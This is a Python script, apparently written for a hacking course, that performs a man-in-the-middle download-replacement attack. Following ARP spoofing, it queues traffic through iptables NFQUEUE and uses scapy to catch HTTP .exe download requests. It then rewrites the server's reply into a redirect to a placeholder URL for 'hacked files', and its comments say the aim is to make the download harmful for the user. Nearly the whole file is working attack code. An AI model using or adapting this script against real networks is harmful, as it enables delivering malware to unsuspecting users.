#we can intercept download and change the download file to something of our choice making it harmful for the user
#this program requires you to run my arp_spoofer.py first
#the following is written to work in our own system with virtual machines, It will still work for other system

#you can test using your linux webserver which is preinstalled in Kali (use command "service apache2 start")
#once started you can access the page using your kali IP

import subprocess
#pip install netfilterqueue
import netfilterqueue
import scapy.all as scapy

def linux_commands_start():
	subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num0", shell=True)
	subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num0", shell=True)
	#to test on your another computer change the above command two command with a single "iptables -I FORWARD -j NFQUEUE --queue-num0" command
	subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def linux_commands_end():
	subprocess.call("iptables --flush", shell=True)

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].len
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if b".exe" in scapy_packet[scapy.Raw].load: #add and b"IP" not in scapy_packet[scapy.Raw].load: (for bypassing HTTPS)
				print(".exe download requested")
				ack_list.append(scapy_packet[scapy.TCP].ack)

		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("Replacing files")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: URL TO DOWNLOAD HACKED FILES FROM\n\n")

				packet.set_payload(str(modified_packet))

	packet.accept() #reffer net_cut.py for more details

linux_commands_start()

ack_list = []

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

linux_commands_end()